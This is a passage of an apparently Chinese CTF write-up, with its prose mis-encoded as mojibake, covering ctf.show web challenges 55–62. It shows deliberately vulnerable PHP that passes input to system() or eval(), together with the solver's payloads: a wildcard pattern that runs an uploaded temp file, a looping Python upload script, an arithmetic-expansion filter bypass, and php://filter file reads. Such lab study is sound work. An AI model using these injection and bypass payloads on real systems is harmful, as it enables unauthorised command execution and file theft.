</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>æ–‡ä»¶åï¼š<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;æäº¤&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>åœ¨ä¸Šä¼ çš„æ–‡ä»¶é‡Œé¢å†™å…¥shæŒ‡ä»¤</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="cp"></span>ls
</span></span></code></pre></div><p>2.æŠ“åŒ…</p>
<p><img alt="image-20241127181502002" loading="lazy" src="../assets/image-20241127181502002.png"></p>
<p>3.æ„é€ æ‰§è¡Œshå‘½ä»¤çš„poc</p>
<p>è¯¦ç»†è§£é‡Špocçš„æ„é€ ï¼š</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob</a></p>
<p>æˆ‘ä»¬è¿™é‡Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬è¿™é“é¢˜é‡Œé¢çš„å¹²æ‰°æ–‡ä»¶åéƒ½æ˜¯ç”±å°å†™å­—æ¯ç»„æˆçš„ï¼Œæ‰€æœ‰æ–‡ä»¶åéƒ½æ˜¯å°å†™ï¼Œåªæœ‰PHPç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹çš„poc</p>
<pre tabindex="0"><code>?c=.+/???/????????[@-[]
</code></pre><p>æ³¨ï¼šåé¢çš„<code>[@-[]</code>æ˜¯linuxä¸‹é¢çš„åŒ¹é…ç¬¦ï¼Œæ˜¯è¿›è¡ŒåŒ¹é…çš„å¤§å†™å­—æ¯ã€‚
<img alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy" src="../assets/fcbf237f846ebf0be65c4c9aceaf3714.png"></p>
<p>æˆ‘ä»¬å°±æ¥å§</p>
<p><img alt="image-20241127233056280" loading="lazy" src="../assets/image-20241127233056280.png"></p>
<p>ä¿®æ”¹ä¸€ä¸‹æŒ‡ä»¤å†…å®¹å³å¯å¾—åˆ°flag</p>
<p><img alt="image-20241127233144783" loading="lazy" src="../assets/image-20241127233144783.png"></p>
<h4 id="web56">web56<a hidden class="anchor" aria-hidden="true" href="#web56">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|</span><span class="se">\\</span><span class="s2">$|\(|\{|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>;|[a-z]|[0-9]|\$|(|{|'|&quot;|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªæ•°å­—ï¼Œä¸å½±å“æˆ‘ä»¬ä¸Šé¢˜çš„è§£é¢˜æ–¹æ³•</p>
<p>è¿™é‡Œä¸å†èµ˜è¿°</p>
<p>æ”¾ä¸ªå¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">	<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]&#34;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;feng.txt&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cat flag.php&#39;</span><span class="p">)})</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">	<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">8</span><span class="cl">		<span class="k">break</span>
</span></span></code></pre></div><h4 id="web57">web57<a hidden class="anchor" aria-hidden="true" href="#web57">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-08 01:02:56
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">//flag in 36.php
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|</span><span class="se">\x0a</span><span class="s2">|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat &#34;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤æ¡ä»¶å¢åŠ </p>
<blockquote>
<p>;|[a-z]|[0-9]|`||#|'|&quot;|`|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|=|[/</p></blockquote>
<p>è¿™é“é¢˜æŠŠ<code>?</code>è¿‡æ»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p>
<pre tabindex="0"><code>system(&#34;cat &#34;.$c.&#34;.php&#34;);
</code></pre><p>è¿™é¢˜ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„getå‚æ•°è¿›è¡Œæ‹¼æ¥åå†æ‰§è¡Œ</p>
<p>é¢˜ç›®é‡Œæœ‰ä¸ªæš—ç¤º</p>
<pre tabindex="0"><code>//flag in 36.php
</code></pre><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ç”¨ç¬¦å·æ„é€ å‡º36</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨linuxçš„$(())æ„é€ å‡º36</p>
<p>åœ¨linuxé‡Œé¢$(())=0ï¼Œ$((~ $(()) ))=-1</p>
<p>å…¶ä¸­~ç¬¦å·è¡¨ç¤ºå–åï¼Œè¿™é‡Œ0çš„å–åç­‰äºï¼1</p>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å…ˆå°†36ä¸ª-1åŠ èµ·æ¥å†å–åå¾—åˆ°æˆ‘ä»¬éœ€è¦çš„36</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
</code></pre><p><img alt="image-20241128205205756" loading="lazy" src="../assets/image-20241128205205756.png"></p>
<p>ä»è€Œå¾—åˆ°flag</p>
<h4 id="web58">web58<a hidden class="anchor" aria-hidden="true" href="#web58">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>c=highlight_file(&#34;flag.php&#34;);
c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php //æ–‡ä»¶åŒ…å«ï¼Œå¾—åˆ°çš„å›æ˜¾éœ€è¦è¿›è¡Œbase64è§£ç 
c=show_source(&#39;flag.php&#39;);
</code></pre><h4 id="web59">web59<a hidden class="anchor" aria-hidden="true" href="#web59">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è§£æ³•ä¸ä¸Šé¢˜ä¸€è‡´ï¼Œä¸å†èµ˜è¿°</p>
<p>ï¼ˆæ²¡ææ‡‚ä¸¤é¢˜æœ‰ä»€ä¹ˆåŒºåˆ«ï¼‰</p>
<h4 id="web60">web60<a hidden class="anchor" aria-hidden="true" href="#web60">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è§£æ³•ä¾æ—§ä¸web58ä¸€è‡´</p>
<p>å¯èƒ½æˆ‘å¤ªèœäº†çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆåŒºåˆ«</p>
<h4 id="web61">web61<a hidden class="anchor" aria-hidden="true" href="#web61">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§web58</p>
<h4 id="web62">web62<a hidden class="anchor" aria-hidden="true" href="#web62">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§&hellip;</p>
<h4 id="web62-1">web62<a hidden class="anchor" aria-hidden="true" href="#web62-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
